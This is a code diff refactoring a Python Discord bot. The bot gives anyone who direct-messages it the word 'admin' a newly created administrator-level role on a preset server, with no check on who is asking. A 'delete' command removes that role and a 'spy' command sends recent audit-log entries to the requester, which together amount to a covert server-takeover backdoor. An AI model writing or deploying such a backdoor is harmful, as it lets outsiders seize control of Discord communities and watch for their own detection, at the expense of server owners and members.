@@ -4,22 +4,22 @@ from discord.ext import commands
 def get_settings():
     settings = {}
     try:
-        with open('data.txt', 'r') as file:
+        with open('data.txt', 'r', encoding='utf-8') as file:
             for line in file:
                 if line.startswith('TOKEN='):
                     settings['TOKEN'] = line.strip().split('=')[1]
-                elif line.startswith('ADMINUSER='):
-                    settings['ADMINUSER'] = line.strip().split('=')[1]
                 elif line.startswith('ADMIN_SERVER='):
                     settings['ADMIN_SERVER'] = line.strip().split('=')[1]
                 elif line.startswith('ROLE_NAME='):
                     settings['ROLE_NAME'] = line.strip().split('=')[1]
     except FileNotFoundError:
-        print("Not data.txt")
+        print("data.txt not found")
     return settings
 
 settings = get_settings()
+TOKEN = settings.get('TOKEN')
 ROLE_NAME = settings.get('ROLE_NAME')
+ADMIN_SERVER = int(settings.get('ADMIN_SERVER'))
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -29,94 +29,94 @@ intents.guild_reactions = True
 intents.guild_scheduled_events = True
 intents.members = True
 
-client = commands.Bot(command_prefix='/', intents=intents)
+class AdminCog(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
 
-@client.event
-async def on_ready():
-    print(f'Longin Success!: {client.user}')
-
-@client.event
-async def on_message(message):
-    if message.author.bot:
-        return
-
-    if isinstance(message.channel, discord.DMChannel):
-        admin_user_id = int(settings.get('ADMINUSER'))
-        guild_id = int(settings.get('ADMIN_SERVER'))
-
-        guild = client.get_guild(guild_id)
-        if not guild:
-            await message.channel.send("Not Server")
+    @commands.Cog.listener()
+    async def on_message(self, message):
+        if message.author.bot:
             return
 
-        print(f"Received DM from: {message.author.name}, content: {message.content}")
-        print(f"Guild ID: {guild_id}, Guild Name: {guild.name}")
+        if isinstance(message.channel, discord.DMChannel):
+            if message.content.startswith('admin'):
+                await self.admin_command(message)
+            
+            elif message.content.startswith('delete'):
+                await self.delete_command(message)
+                
+            elif message.content.startswith('spy'):
+                await self.spy_command(message)
 
+    async def admin_command(self, message):
+        guild = self.bot.get_guild(ADMIN_SERVER)
+        if guild is None:
+            await message.channel.send("Server not found.")
+            return
+        
         member = guild.get_member(message.author.id)
         if member is None:
             member = await guild.fetch_member(message.author.id)
 
-        print(f"Member: {member}")
-
         if member is None:
-            await message.channel.send(f"Members are servers `{guild.name}` does not exist in .")
+            await message.channel.send(f"Member not found in server `{guild.name}`.")
             return
 
-        content = message.content.lower()
-        if content == 'admin':
-            await admin_command(guild, member, message.channel)
-        elif content == 'delete':
-            await delete_command(guild, member, message.channel)
-        elif content == 'spy':
-            await spy_command(guild, message.channel)
+        role = discord.utils.get(guild.roles, name=ROLE_NAME)
+        if not role:
+            role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
 
-async def admin_command(guild, member, channel):
-    role = discord.utils.get(guild.roles, name=ROLE_NAME)
-    if role:
-        await channel.send("The role already exists.")
-    else:
-        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
-        await channel.send(f"`{ROLE_NAME}` is created")
+        if role in member.roles:
+            await message.channel.send(f"You already have the `{ROLE_NAME}` role.")
+        else:
+            await member.add_roles(role)
+            await message.channel.send(f"Added `{ROLE_NAME}` role to you.")
 
-    if role in member.roles:
-        await channel.send(f" You have the `{ROLE_NAME}` role.")
-    else:
-        await member.add_roles(role)
-        await channel.send(f"`{ROLE_NAME}` has been granted.")
+    async def delete_command(self, message):
+        guild = self.bot.get_guild(ADMIN_SERVER)
+        if guild is None:
+            await message.channel.send("Server not found.")
+            return
 
-async def delete_command(guild, member, channel):
-    role = discord.utils.get(guild.roles, name=ROLE_NAME)
-    if role:
-        await role.delete()
-        await channel.send(f" `{ROLE_NAME}` has been deleted.")
-    else:
-        await channel.send(f" `{ROLE_NAME}` does not exist.")
+        role = discord.utils.get(guild.roles, name=ROLE_NAME)
+        if role:
+            await role.delete()
+            await message.channel.send(f"Deleted `{ROLE_NAME}` role.")
+        else:
+            await message.channel.send(f"`{ROLE_NAME}` role does not exist.")
 
-async def spy_command(guild, channel):
-    try:
-        audit_logs = []
-        async for log in guild.audit_logs(limit=10):
-            audit_logs.append(log)
+    async def spy_command(self, message):
+        guild = self.bot.get_guild(ADMIN_SERVER)
+        if guild is None:
+            await message.channel.send("Server not found.")
+            return
 
-        log_messages = []
-        for log in reversed(audit_logs):
-            action = log.action
-            user = log.user.name if log.user else 'Unknown'
-            target = log.target
-            reason = log.reason if log.reason else 'None'
-            timestamp = log.created_at.strftime("%Y-%m-%d %H:%M:%S")
+        try:
+            audit_logs = []
+            async for log in guild.audit_logs(limit=10):
+                audit_logs.append(log)
 
-            log_message = f"**{timestamp}** - **Action:** {action}\n**User:** {user}\n**Target:** {target}\n**Reason:** {reason}\n"
-            log_messages.append(log_message)
+            log_messages = []
+            for log in reversed(audit_logs):
+                action = log.action
+                user = log.user.name if log.user else 'Unknown'
+                target = log.target
+                reason = log.reason if log.reason else 'None'
+                timestamp = log.created_at.strftime("%Y-%m-%d %H:%M:%S")
 
-        response_message = '\n'.join(log_messages)
-        await channel.send(f"```\n{response_message}\n```")
-    except Exception as e:
-        await channel.send(f"Error: {e}")
-        print(f"Error getting audit logs: {e}") 
+                log_message = f"**{timestamp}** - **Action:** {action}\n**User:** {user}\n**Target:** {target}\n**Reason:** {reason}\n"
+                log_messages.append(log_message)
 
-TOKEN = settings.get('TOKEN')
-if TOKEN:
-    client.run(TOKEN)
-else:
-    print("TOKEN not set")
+            response_message = '\n'.join(log_messages)
+            await message.channel.send(f"```\n{response_message}\n```")
+        except Exception as e:
+            await message.channel.send(f"Error getting audit logs: {e}")
+            print(f"Error getting audit logs: {e}")
+
+async def setup(bot):
+    await bot.add_cog(AdminCog(bot))
+
+if __name__ == "__main__":
+    bot = commands.Bot(command_prefix='!', intents=intents)
+    bot.load_extension('admin')
+    bot.run(TOKEN)
